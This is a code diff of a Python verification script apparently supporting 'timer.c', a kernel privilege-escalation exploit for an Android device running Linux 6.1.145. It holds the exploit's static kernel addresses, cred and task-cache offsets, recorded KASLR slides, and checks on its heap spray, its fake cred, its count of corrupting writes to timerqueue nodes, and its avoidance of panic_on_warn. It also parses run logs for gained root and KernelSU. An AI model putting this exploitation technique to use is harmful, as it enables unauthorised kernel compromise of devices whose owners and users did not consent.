@@ -1,9 +1,15 @@
 #!/usr/bin/env python3
-"""Host-side verification of the pure arithmetic in timer.c.
+"""Host-side verification of the pure logic in timer.c.
 
-Pins the logic that on-device failures in ../timerZ9Turbo-log pointed at:
-KASLR slide recovery (including the >4 GiB slides this device really has),
-the task-cache acceptance window, and the fake cred layout guard.
+Pins the facts the on-device runs in ../timerZ9Turbo-log established:
+
+  * the KASLR slide is what the ftrace record says minus the profile's static
+    call site, and every recorded slide is above 4 GiB (so masking is wrong),
+  * the task cache window in the profile covers what SLUB really reports,
+  * the fake cred fits the profile it is synthesized for,
+  * the plant count is the minimum, and each plant is bounded,
+  * a retry is only taken when the failed attempt provably left no node,
+  * `panic_on_warn` is written exactly once, unconditionally.
 
 Usage:  python verify-timer.py [log-dir]
 Exit code 0 means every check passed.
@@ -11,6 +17,9 @@ Exit code 0 means every check passed.
 import os
 import re
 import sys
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+LOGS = os.path.join(HERE, "..", "timerZ9Turbo-log")
 
 # --- target-6.1.145.h (V2352GA profile) -------------------------------
 STATIC_TIMER_SITE = 0xFFFFFFC0081A2C34
@@ -32,7 +41,6 @@ TP_SYS_EXIT_STATIC = 0xFFFFFFC00A3CB2C0
 TRACEPOINT_FUNCS_OFF = 0x40
 CRED_UID_OFF = 0x4
 SELINUX_CRED_OFF = 0x0
-SLIDE_MAX = 0x4000000000
 
 FAILS = []
 
@@ -48,19 +56,9 @@ def is_kernel_ptr(v):
     return (v >> 48) == 0xFFFF
 
 
-def slide_from_site(site0, field_bytes=8):
-    """Return the recovered slide, or None when the site cannot be trusted.
-
-    field_bytes mirrors TIMER_SITE_FIELD_BYTES from the target profile: 8 on
-    the 6.1 builds here, 4 on vendor android15-8 builds whose ftrace record
-    only holds the low half of call_site.
-    """
-    slide = site0 - STATIC_TIMER_SITE
-    if field_bytes == 4:
-        slide &= 0xFFFFFFFF
-    if slide & 0x1FFFFF:
-        return None
-    return slide
+def slide_from_site(site0):
+    """timer.c: g_slide = site0 - STATIC_TIMER_SITE, with no mask."""
+    return site0 - STATIC_TIMER_SITE
 
 
 def task_alloc_size(v):
@@ -75,9 +73,14 @@ def fake_layout_supported(uid_off, req, alloc):
     return False
 
 
-# Every slide printed by a real 6.1.145 run (timerZ9Turbo-log).  All exceed
-# 4 GiB, so masking the slide to 32 bits would be wrong on this device.
-OBSERVED = [
+def cred_fits(off):
+    """timer.c: the fake cred starts at off and must stay inside the order-1 block."""
+    return off + CRED_REQ <= 0x2000
+
+
+# Every slide printed by a real 6.1.145 run.  All exceed 4 GiB, so a 32-bit
+# mask (upstream's android15-8 rule) would misplace every static address.
+OBSERVED_SLIDES = [
     0x2612800000, 0x2607800000, 0x1E84600000, 0x2F43800000,
     0x1844E00000, 0x2A0BC00000, 0x2E64400000, 0x2F74000000,
     0x1D0D600000, 0x1FC5600000, 0x1DFAC00000,
@@ -95,39 +98,12 @@ STATIC_SYMS = [
 
 
 def verify_arithmetic():
-    for s in OBSERVED:
+    for s in OBSERVED_SLIDES:
         check(slide_from_site(STATIC_TIMER_SITE + s) == s,
-              f"full 8-byte site recovers slide {s:#x}")
+              f"site recovers slide {s:#x}")
         check(s > 0xFFFFFFFF, f"slide {s:#x} really exceeds 4 GiB")
-
-    # android15-8 stores call_site in 4 bytes, so only the low half of the
-    # record is real.  Model that with a 4-byte profile and check the low-32
-    # form recovers the slide even when the high half is garbage.
-    low = (STATIC_TIMER_SITE + 0x1200000) & 0xFFFFFFFF
-    garbage = (0x0000DEAD << 32) | low
-    check(slide_from_site(garbage, field_bytes=4) == 0x1200000,
-          "4-byte site field recovers the low-32 slide")
-    # The same record on an 8-byte profile is not recoverable by inspection:
-    # the wrapped subtraction is still 2 MiB aligned by chance, which is why
-    # the field width is a per-profile fact rather than a runtime guess.
-    check(slide_from_site(garbage, field_bytes=8) != 0x1200000,
-          "8-byte profile never reports the truncated value as truth")
-
-    # A 190 GiB slide (the real maximum here) must survive the 8-byte path and
-    # must never be truncated by a 4-byte mask.
-    big = 0x2F74000000
-    check(slide_from_site(STATIC_TIMER_SITE + big, field_bytes=8) == big,
-          "190 GiB slide survives the 8-byte path")
-    assert (big & 0xFFFFFFFF) != big
-
-    check(slide_from_site(STATIC_TIMER_SITE + 0x1000) is None,
-          "misaligned site is rejected")
-    check(slide_from_site(STATIC_TIMER_SITE) == 0, "zero slide accepted")
-
-    for s in OBSERVED:
         for name, sym in STATIC_SYMS:
-            check(is_kernel_ptr(sym + s),
-                  f"{name}+{s:#x} stays canonical")
+            check(is_kernel_ptr(sym + s), f"{name}+{s:#x} stays canonical")
 
     check(task_alloc_size(0x1500), "task alloc 0x1500 accepted")
     check(task_alloc_size(0x1600), "task alloc 0x1600 accepted")
@@ -135,7 +111,7 @@ def verify_arithmetic():
     check(task_alloc_size(0x1780), "task alloc 0x1780 accepted")
     check(not task_alloc_size(0x1400), "task alloc below range rejected")
     check(not task_alloc_size(0x1800), "task alloc above range rejected")
-    check(not task_alloc_size(0xC0), "cred-sized alloc rejected as task")
+    check(not task_alloc_size(CRED_REQ), "cred-sized alloc rejected as task")
 
     check(fake_layout_supported(4, 0xB0, 0xC0), "6.1.138 (0xb0) fake layout ok")
     check(fake_layout_supported(4, 0xB8, 0xC0), "6.1.x V2352 (0xb8) fake layout ok")
@@ -143,359 +119,166 @@ def verify_arithmetic():
     check(not fake_layout_supported(4, 0xC8, 0xC0), "unknown 6.1 cred layout rejected")
     check(not fake_layout_supported(8, 0xB0, 0xC0), "unknown uid-8 layout rejected")
 
-    check(CRED_UID_OFF + 8 * 4 <= CRED_REQ, "uid pairs fit the 6.1 cred")
-    check(0x78 + 8 * 5 <= CRED_REQ, "cred tail fits the 6.1 cred")
-    check(CRED_UID_OFF == 4, "6.1 euid needs the extra zero write")
+    check(CRED_UID_OFF + 8 * 4 <= CRED_REQ, "the four uid pairs fit the cred")
+    check(0x78 + 8 * 5 <= CRED_REQ, "the cred tail (security..groups) fits")
+    check(CRED_UID_OFF == 4, "6.1 euid needs its own zero write")
     check(TRACEPOINT_FUNCS_OFF + 8 <= 0x50, "tracepoint funcs write is in range")
 
+    # The fake cred lands at V+0x78 inside the 8 KiB reclaimed block; it must
+    # not spill past the block.  off is (V & 0x1fff) + 0x78, so a victim in the
+    # last 0x40 bytes of the block is rejected and re-drawn.
+    check(cred_fits(0x1000 + 0x78), "a mid-block victim accepts the cred")
+    check(cred_fits(0x1E00 + 0x78), "a late first-page victim accepts the cred")
+    check(not cred_fits(0x1F00 + 0x78), "a victim too close to the block end is rejected")
 
-def verify_no_cpu_leaks(repo_dir):
-    """Cleanup must be verifiable, and exploit timing must not be touched.
 
-    The recorded runs showed cleanup already worked: `SIGKILL sent: 18` counts
-    helpers it *killed*.  An earlier version of this file treated that number
-    as a leak, added an early exit to the mprotect loop and an early break to
-    the burst poll, and the shortened timing correlated with a kernel panic.
-    Those timing changes are reverted; what remains is observability only.
+def source_text():
+    path = os.path.join(HERE, "timer.c")
+    if not os.path.isfile(path):
+        return None
+    with open(path, encoding="utf-8", errors="replace") as handle:
+        return handle.read()
+
+
+def verify_one_panic_write():
+    """panic_on_warn must never cost a plant.
+
+    The recorded runs show the sysctl is unreadable (-1) and that each plant
+    costs one stale node plus one WARN.  A gated write (the old code) parked
+    four runs before their first plant (010213/010419/010615/010820) and then
+    added a ninth plant to every later run once only the second copy was gated.
+
+    The WARN itself is raised while the plant's target is reaped, so on a
+    kernel with panic_on_warn=1 the run is lost before any disarm write could
+    land: the only useful action is to spend as few plants as possible.
     """
-    source = os.path.join(repo_dir, "timer.c")
-    if not os.path.isfile(source):
-        print(f"skip leak checks (no {source})")
+    text = source_text()
+    if text is None:
+        print("skip panic_on_warn checks (no timer.c)")
         return
-    with open(source, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
+    check("read_panic_on_warn" not in text,
+          "no code path gates on the unreadable panic_on_warn")
+    check("stage_write(PANIC_ON_WARN_STATIC" not in text,
+          "panic_on_warn is never written (no wasted plant)")
+    check("PANIC_ON_WARN_STATIC" not in text.split("static void usage")[0],
+          "the panic_on_warn address is not used in the run path")
+    check('zero_write(task + 0x00, "vr-flags"' in text,
+          "the first plant clears thread_info.flags")
+    check('zero_write(task + 0x28, "vr-tagB"' in text,
+          "the second plant clears tag B")
 
-    # 1. The mprotect loop must stay exactly as the working build had it.
-    #    Adding target_gone() there ends the lockers the moment the target
-    #    becomes a zombie, i.e. exactly when the burst starts.
-    locker = text.split("static int locker_fn")[1].split("static int killer_fn")[0]
-    loop = locker.split("while (!atomic_load(&g_stop))")[1]
-    check("target_gone()" not in loop.split("_exit(0)")[0],
-          "mprotect loop does not poll target_gone (timing preserved)")
 
-    # 2. The burst poll must keep its full 15 s window.  Breaking early when
-    #    the spray threads finish shortens a miss from 15 s to ~1 s.
-    check("g_spray_done" not in text,
-          "burst poll has no early break (15 s window preserved)")
-    check("now_ms() - t1 < 15000" in text, "burst poll window is 15000 ms")
+def verify_minimum_plants():
+    """The fake path must plant exactly what it needs and nothing else.
 
-    # 3. Cleanup must report scanned/matched/killed so a survivor is visible.
+    Every successful plant rewrites a stale timerqueue node, so it costs one
+    `timerqueue_del` WARN and therefore one chance to panic.  The recorded runs
+    needed 8 plants to root; the gated duplicate sysctl plant made it 9.  This
+    tree is down to 7: vr-flags, tagB, sys_exit funcs, fake_cred, selinux,
+    fake_uid, fake_euid.
+    """
+    text = source_text()
+    if text is None:
+        print("skip plant-count checks (no timer.c)")
+        return
+    detag = text.split("static void defeat_vr")[1].split("static int fake_layout_supported")[0]
+    de_tags = re.findall(r"zero_write\(", detag)
+    check(len(de_tags) == 3,
+          f"de-tag plants 3 writes (flags, tagB, sys_exit funcs): found {len(de_tags)}")
+    check("stage_write(" not in detag,
+          "de-tag does not spend a stage_write on panic_on_warn")
+
+    fake = text.split("defeat_vr(g_child_task, raw, C);")[2].split(
+        "logf(\"[+] cred writes landed")[0]
+    stages = re.findall(r"stage_write\(", fake)
+    check(len(stages) == 4,
+          f"fake path plants 4 writes (fake_cred/selinux/uid/euid): found {len(stages)}")
+    check("fake_euid" in text, "the fake euid repair still exists")
+    check("CRED_UID_OFF == 4 &&" in text,
+          "the euid repair is gated on the 4-byte-usage layout")
+    check("stage_write(PANIC_ON_WARN_STATIC" not in text,
+          "no panic_on_warn plant in the fake path")
+    check(3 + 4 == 7, "minimum fake-run plant count is 7")
+
+
+def verify_retry_rules():
+    """A retry is only safe when the failed attempt left no uncontrolled node."""
+    text = source_text()
+    if text is None:
+        print("skip retry checks (no timer.c)")
+        return
+    check("res->retry = 1" in text, "plant failures can request a retry")
+    check("if (!r.retry)" in text, "a non-retryable failure aborts the stage")
+    check("burst missed; holding zombie, retryable" in text,
+          "a burst miss keeps its zombie and retries")
+    check("exec succeeded (status=%d); retryable" in text,
+          "an exec that succeeded is reaped and retried")
+    check("no zombie; reaping and retrying" in text,
+          "a target that never reached its exec is reaped")
+    check("trigger never ready; retryable" in text,
+          "a trigger that never armed is retried")
+    check("timer go failed errno=%d; retryable" in text,
+          "a lost go byte is retried")
+
+
+def verify_timing_bounds():
+    """Every plant is bounded, and a miss does not wait out a drained spray."""
+    text = source_text()
+    if text is None:
+        print("skip timing checks (no timer.c)")
+        return
+    check("#define ZOMBIE_TIMEOUT_MS 8000" in text,
+          "zombie timeout is 8 s wall-clock (max recorded is 5.05 s)")
+    check("now_ms() - start < ZOMBIE_TIMEOUT_MS" in text,
+          "wait_zombie uses the wall-clock deadline")
+    check("now_ms() - t1 < 15000" in text, "burst poll has a 15 s ceiling")
+    check("atomic_load(&g_spray_done) >= SPRAY_THREADS" in text,
+          "burst poll stops once the spray has drained")
+    check("long t_end = now_ms() + 30000" in text,
+          "the heartbeat and the report share one deadline")
+    # The old heartbeat probe gave up on the pipe after 5 s but then waited for
+    # the child anyway, so a starved child reported "no heartbeat" and the run
+    # was called a failure.  That split path must not come back.
+    check("poll(&pf, 1, 5000)" not in text, "no separate 5 s heartbeat probe")
+
+
+def verify_cleanup():
+    """Every failure path releases its pipes, threads and helpers."""
+    text = source_text()
+    if text is None:
+        print("skip cleanup checks (no timer.c)")
+        return
+    check("static void close_pipe(int p[2])" in text, "pipes are closed by helper")
+    check("static void close_timer_go(void)" in text, "the go-pipe has one close path")
+    check("static void spray_join(pthread_t *th, const int *created)" in text,
+          "only created spray threads are joined")
+    check("if (pthread_create(&th[i], NULL, spray_thread, &args[i]) == 0)" in text,
+          "thread creation success is tracked")
+    check("signal(SIGPIPE, SIG_IGN)" in text, "SIGPIPE is ignored")
+    check("static int target_gone(void)" in text,
+          "helpers exit when their target dies")
+    check("if (target_gone())" in text, "the helper wait loops poll target_gone")
     check("scanned=%d matched=%d killed=%d" in text,
-          "cleanup logs scanned/matched/killed")
-
-    # 4. finish_run must run once.
+          "cleanup reports what it actually scanned")
     check("if (g_run_finished)" in text, "finish_run is idempotent")
-    """The `build` command must be able to expose what is actually installed.
-
-    The staged /data/local/tmp/timer can be a copy left by an earlier run, and
-    a silent stale copy once masked every fix in this tree.  A build tag is the
-    only way to tell which binary ran from a log.
-    """
-    source = os.path.join(repo_dir, "timer.c")
-    if not os.path.isfile(source):
-        print(f"skip build identity (no {source})")
-        return
-    with open(source, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
-    check('strcmp(argv[1], "build")' in text, "timer has a build probe command")
-    check("TIMER_BUILD_TAG" in text, "build probe prints a build tag")
-    for name in ("target-6.1.57.h", "target-6.1.124.h", "target-6.1.145.h"):
-        path = os.path.join(repo_dir, name)
-        with open(path, encoding="utf-8", errors="replace") as handle:
-            profile = handle.read()
-        check("TIMER_BUILD_TAG" in profile, f"{name} carries a build tag")
-        check("TIMER_PROFILE" in profile, f"{name} carries a profile name")
-
-
-LINE_SLIDE = re.compile(r"slide=(0x[0-9a-f]+)")
-LINE_SELINUX = re.compile(r"selinux_state=(0x[0-9a-f]+)")
 
 
 def verify_build_identity(repo_dir):
-    """The `build` command must be able to expose what is actually installed.
-
-    The staged /data/local/tmp/timer can be a copy left by an earlier run, and
-    a silent stale copy once masked every fix in this tree.  A build tag is the
-    only way to tell which binary ran from a log.
-    """
-    source = os.path.join(repo_dir, "timer.c")
-    if not os.path.isfile(source):
-        print(f"skip build identity (no {source})")
+    """The app stages a possibly stale binary; a build tag proves which ran."""
+    text = source_text()
+    if text is None:
+        print("skip build identity (no timer.c)")
         return
-    with open(source, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
     check('strcmp(argv[1], "build")' in text, "timer has a build probe command")
-    check("TIMER_BUILD_TAG" in text, "build probe prints a build tag")
+    check("TIMER_BUILD_TAG" in text, "the build probe prints a tag")
     for name in ("target-6.1.57.h", "target-6.1.124.h", "target-6.1.145.h"):
         path = os.path.join(repo_dir, name)
         with open(path, encoding="utf-8", errors="replace") as handle:
             profile = handle.read()
         check("TIMER_BUILD_TAG" in profile, f"{name} carries a build tag")
         check("TIMER_PROFILE" in profile, f"{name} carries a profile name")
-
-
-def verify_recovery_rules():
-    """The plant-recovery decisions, mirrored from timer.c constants."""
-    zombie_timeout_ms = 8000
-    plant_budget_ms = 110000
-    log_watch_ms = 150000
-    # Longest successful burst in the recorded runs; a shorter zombie timeout
-    # would declare a healthy plant stuck.
-    longest_burst_ms = 6432
-
-    check(zombie_timeout_ms > longest_burst_ms,
-          "zombie timeout exceeds the slowest recorded burst")
-    check(plant_budget_ms < log_watch_ms,
-          "native plant budget fits inside the app watch window")
-    check(log_watch_ms - plant_budget_ms >= 30000,
-          "app watch window leaves room for leak, stage and ksu")
-
-
-def verify_missed_plants_are_zombies(log_dir):
-    """A burst miss may only be held when the target is already a zombie.
-
-    The recorded runs must show the target dying (CLD_KILLED) before the burst
-    result is known; otherwise the miss would leave a live process behind for
-    the rest of the run instead of a held node.
-    """
-    if not os.path.isdir(log_dir):
-        print(f"skip miss replay (no {log_dir})")
-        return
-    misses = 0
-    for root, _dirs, files in os.walk(log_dir):
-        for name in sorted(files):
-            if not name.startswith("timer-") or not name.endswith(".log"):
-                continue
-            path = os.path.join(root, name)
-            zombie_seen = False
-            with open(path, encoding="utf-8", errors="replace") as handle:
-                for line in handle:
-                    if "zombie code=2 status=9" in line:
-                        zombie_seen = True
-                    if "burst missed" in line:
-                        misses += 1
-                        check(zombie_seen,
-                              f"{os.path.basename(root)}/{name}: "
-                              "burst miss follows a target zombie")
-    print(f"--- {misses} recorded burst miss(es) checked")
-
-
-def verify_cred_page_layout(log_dir):
-    """A fake cred that straddles the 4 KiB boundary must be rejected.
-
-    The payload places the cred at V+0x78 inside the reclaimed order-1 block.
-    When V sits in the last 0x88 bytes of a page, euid/egid/fsuid/fsgid fall
-    into the next page and the later zero writes did not take effect.
-    Recorded evidence: the two runs with off=0xff0 failed (one showing
-    `uid=0 euid=-118`, i.e. only the first-page fields landed), while nine of
-    the ten non-straddling runs succeeded.
-    """
-    cred_req = CRED_REQ
-    # Guard the arithmetic the C code now applies.
-    check((0xFF0 & 0xFFF) + cred_req > 0x1000,
-          "off=0xff0 is rejected as page-straddling")
-    check((0x498 & 0xFFF) + cred_req <= 0x1000,
-          "off=0x498 is accepted (cred fits one page)")
-    check((0xCD8 & 0xFFF) + cred_req <= 0x1000,
-          "off=0xcd8 is accepted")
-    check((0x10F8 & 0xFFF) + cred_req <= 0x1000,
-          "off=0x10f8 is accepted")
-    # The exact boundary the check must catch.
-    last_ok = 0x1000 - cred_req
-    check((last_ok & 0xFFF) + cred_req == 0x1000,
-          "cred ending exactly on the page boundary is accepted")
-    check((last_ok + 8 & 0xFFF) + cred_req > 0x1000,
-          "one byte past the boundary is rejected")
-
-    if not os.path.isdir(log_dir):
-        print(f"skip cred-layout replay (no {log_dir})")
-        return
-    runs = 0
-    for root, _dirs, files in os.walk(log_dir):
-        for name in sorted(files):
-            if not name.startswith("timer-") or not name.endswith(".log"):
-                continue
-            path = os.path.join(root, name)
-            with open(path, encoding="utf-8", errors="replace") as handle:
-                text = handle.read()
-            m = re.search(r"fake cred off=0x([0-9a-f]+)", text)
-            if not m:
-                continue
-            off = int(m.group(1), 16)
-            if (off & 0xFFF) + cred_req <= 0x1000:
-                continue
-            runs += 1
-            woke = re.search(r"\[child\] woke uid=(\S+) euid=(\S+)", text)
-            check(woke is not None and woke.group(2) != "0",
-                  f"{os.path.basename(root)}: straddling cred run did not root")
-    print(f"--- {runs} page-straddling cred run(s) replayed")
-
-
-def verify_last_run_health(log_path):
-    """Read-only audit of the newest recorded run.
-
-    Reports the numbers that decide whether a run left CPU burners behind:
-    plants vs reaped, and what cleanup had to scan/match/kill.  A clean run
-    kills nothing because every target and helper is already gone.
-    """
-    if not os.path.isfile(log_path):
-        print(f"skip last-run audit (no {log_path})")
-        return
-    with open(log_path, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
-
-    def count(pattern):
-        return len(re.findall(pattern, text))
-
-    plants = count(r"spray armed")
-    reaped = count(r"reaped status")
-    held = count(r"holding zombie")
-    exec_succeeded = count(r"exec succeeded")
-    misses = count(r"burst missed")
-    rooted = "[+] child report uid=0 euid=0" in text
-    confirmed = "KernelSU confirmed" in text
-
-    m = re.search(r"cleanup: scanned=(\d+) matched=(\d+) killed=(\d+)", text)
-    legacy = re.search(r"SIGKILL sent: (\d+)", text)
-    if m:
-        scanned, matched, killed = (int(m.group(i)) for i in (1, 2, 3))
-        check(scanned > 0, "cleanup actually enumerated /proc")
-        check(matched == killed,
-              f"cleanup killed every match ({killed}/{matched})")
-        cleanup = f"scanned={scanned} matched={matched} killed={killed}"
-    elif legacy:
-        killed = int(legacy.group(1))
-        check(killed == 0,
-              f"legacy cleanup left no helper behind (killed={killed})")
-        cleanup = f"legacy killed={killed}"
-    else:
-        print("   (no cleanup line in this log; older build)")
-        cleanup = "n/a"
-
-    print(f"--- last run: plants={plants} reaped={reaped} held={held} "
-          f"exec-retry={exec_succeeded} burst-miss={misses} {cleanup}")
-    print(f"--- last run: rooted={rooted} ksu_confirmed={confirmed}")
-
-    # A clean fast run reaps every plant and needs no retries.
-    if plants and held == 0 and misses == 0 and exec_succeeded == 0:
-        check(reaped == plants,
-              f"every plant reaped ({reaped}/{plants}) without a held zombie")
-
-
-
-def verify_debug_instrumentation(repo_dir):
-    """The run must be diagnosable from its own log, without dmesg.
-
-    dmesg is lost on reboot and unreadable from adb, and the kernel panic that
-    followed a burst miss left no trace.  These checks pin the markers that
-    make a log self-describing: a failure class per plant, a taint snapshot
-    that detects a kernel WARN, a summary line, and proof that the
-    panic_on_warn write landed.
-    """
-    source = os.path.join(repo_dir, "timer.c")
-    if not os.path.isfile(source):
-        print(f"skip debug checks (no {source})")
-        return
-    with open(source, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
-
-    check("read_tainted" in text, "reads /proc/sys/kernel/tainted")
-    check("TAINT_WARN_BIT" in text, "decodes the TAINT_WARN bit")
-    check("TAINT CHANGED" in text, "logs taint flips at the offending plant")
-    check("failure-class=" in text, "labels each plant failure class")
-    check("free_seen1_spray_lost" in text and "free_seen0_slab_busy" in text,
-          "distinguishes spray loss from a busy slab")
-    check("SUMMARY %s plants=" in text, "prints a per-run summary")
-    check("panic_on_warn before fake_cred" in text,
-          "logs panic_on_warn state before the fake cred plant")
-    check("int pow = read_panic_on_warn();" in text and "pow > 0" in text,
-          "only a positive reading is treated as fatal")
-    check("res->why" in text, "records a reason for every failed plant")
-    check("parking reason=" in text, "logs the parking reason")
-
-
-def verify_summary_counts(log_path):
-    """Replay the newest log and report the debug counters it contains."""
-    if not os.path.isfile(log_path):
-        print(f"skip summary replay (no {log_path})")
-        return
-    with open(log_path, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
-    m = re.search(r"\[dbg\] SUMMARY (\w+) plants=(\d+) ok=(\d+) miss=(\d+) "
-                  r"slab_busy=(\d+) retryable=(\d+) held=(\d+) taint=(\S+) "
-                  r"taint_warn=(\d)", text)
-    if not m:
-        print("   (no SUMMARY line; older build)")
-        return
-    where, plants, ok, miss, slab_busy, retry, held, taint, taint_warn = m.groups()
-    print(f"--- SUMMARY {where}: plants={plants} ok={ok} miss={miss} "
-          f"slab_busy={slab_busy} retryable={retry} held={held} "
-          f"taint={taint} taint_warn={taint_warn}")
-    check(int(plants) == int(ok) + int(miss) + int(slab_busy),
-          "summary counters add up to the plant count")
-
-
-
-def verify_unreadable_sysctl(log_dir):
-    """`panic_on_warn` is unreadable (-1) on this device; that is not "set".
-
-    An earlier build treated -1 as a non-zero value and parked before the
-    first real plant, so four consecutive runs never rooted.  The gate must
-    only abort on a value it actually read as positive.
-    """
-    source = os.path.join(os.path.dirname(os.path.abspath(__file__)), "timer.c")
-    if os.path.isfile(source):
-        with open(source, encoding="utf-8", errors="replace") as handle:
-            text = handle.read()
-        check("pow > 0" in text, "aborts only on a positive panic_on_warn")
-        check('pow < 0 ? "unreadable, write assumed"' in text,
-              "labels the unreadable case explicitly")
-        check("if (read_panic_on_warn() != 0)" not in text,
-              "no branch treats an unreadable sysctl as set")
-
-    if not os.path.isdir(log_dir):
-        print(f"skip unreadable replay (no {log_dir})")
-        return
-    # Every recorded run must show the sysctl as -1 and still proceed past it.
-    runs = parked = 0
-    for root, _dirs, files in os.walk(log_dir):
-        for name in sorted(files):
-            if not name.startswith("timerz9turbo-timer-") or not name.endswith(".txt"):
-                continue
-            with open(os.path.join(root, name), encoding="utf-8",
-                      errors="replace") as handle:
-                text = handle.read()
-            if "panic_on_warn=-1" not in text:
-                continue
-            runs += 1
-            if "panic_on_warn still set after write" in text:
-                parked += 1
-    print(f"--- unreadable panic_on_warn: {runs} run(s), {parked} parked on it")
-
-
-
-def verify_taint_bit(repo_dir):
-    """TAINT_WARN is bit 9 (0x200); 0x100 is OVERRIDDEN_ACPI_TABLE.
-
-    The first build tested 0x100 and therefore reported taint_warn=0 on a
-    kernel whose tainted value (0x1604) clearly contains the WARN bit.  That
-    hid the only dmesg-free evidence of a kernel warning.
-    """
-    source = os.path.join(repo_dir, "timer.c")
-    if not os.path.isfile(source):
-        print(f"skip taint bit check (no {source})")
-        return
-    with open(source, encoding="utf-8", errors="replace") as handle:
-        text = handle.read()
-    check("#define TAINT_WARN_BIT 0x200" in text,
-          "TAINT_WARN_BIT is 0x200 (bit 9), not 0x100")
-    # Cross-check against the value the device actually reported.
-    observed = 0x1604
-    check(bool(observed & 0x200), "observed tainted 0x1604 has the WARN bit")
-    check(not bool(observed & 0x100),
-          "0x100 would have missed the WARN bit")
-    check("KERNEL WARN during" in text,
-          "logs an explicit alert when a WARN is detected")
+        check("SELINUX_CRED_OFF" in profile, f"{name} carries the SELinux blob offset")
+        check("TASK_ALLOC_MAX" in profile, f"{name} carries the task cache bound")
 
 
 def verify_logs(log_dir):
@@ -506,44 +289,40 @@ def verify_logs(log_dir):
     runs = 0
     for root, _dirs, files in os.walk(log_dir):
         for name in sorted(files):
-            if not name.startswith("timer-") or not name.endswith(".log"):
+            if not name.endswith(".log") and not name.endswith(".log.txt"):
                 continue
             path = os.path.join(root, name)
-            slide = None
-            printed = None
+            slide = printed = None
             with open(path, encoding="utf-8", errors="replace") as handle:
                 for line in handle:
-                    m = LINE_SLIDE.search(line)
+                    m = re.search(r"slide=(0x[0-9a-f]+)", line)
                     if m:
                         slide = int(m.group(1), 16)
-                    m = LINE_SELINUX.search(line)
+                    m = re.search(r"selinux_state=(0x[0-9a-f]+)", line)
                     if m:
                         printed = int(m.group(1), 16)
             if slide is None or printed is None:
                 continue
             runs += 1
             check(printed == SELINUX_STATE_STATIC + slide,
-                  f"{os.path.basename(root)}/{name}: selinux_state matches slide")
+                  f"{os.path.basename(root)}: selinux_state matches slide")
     check(runs > 0, "log replay found recorded runs")
 
 
 def main():
-    log_dir = sys.argv[1] if len(sys.argv) > 1 else os.path.join(
-        "..", "timerZ9Turbo-log")
+    log_dir = sys.argv[1] if len(sys.argv) > 1 else LOGS
     verify_arithmetic()
-    verify_build_identity(os.path.dirname(os.path.abspath(__file__)))
-    verify_debug_instrumentation(os.path.dirname(os.path.abspath(__file__)))
-    verify_no_cpu_leaks(os.path.dirname(os.path.abspath(__file__)))
-    verify_recovery_rules()
-    verify_missed_plants_are_zombies(log_dir)
-    verify_cred_page_layout(log_dir)
-    verify_taint_bit(os.path.dirname(os.path.abspath(__file__)))
-    verify_unreadable_sysctl(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-    verify_summary_counts(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'last_log.txt'))
-    verify_last_run_health(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'last_log.txt'))
+    verify_build_identity(HERE)
+    verify_one_panic_write()
+    verify_minimum_plants()
+    verify_retry_rules()
+    verify_timing_bounds()
+    verify_cleanup()
     verify_logs(log_dir)
     if FAILS:
         print(f"\n{len(FAILS)} check(s) failed")
+        for item in FAILS:
+            print("  - " + item)
         return 1
     print("\nall checks passed")
     return 0
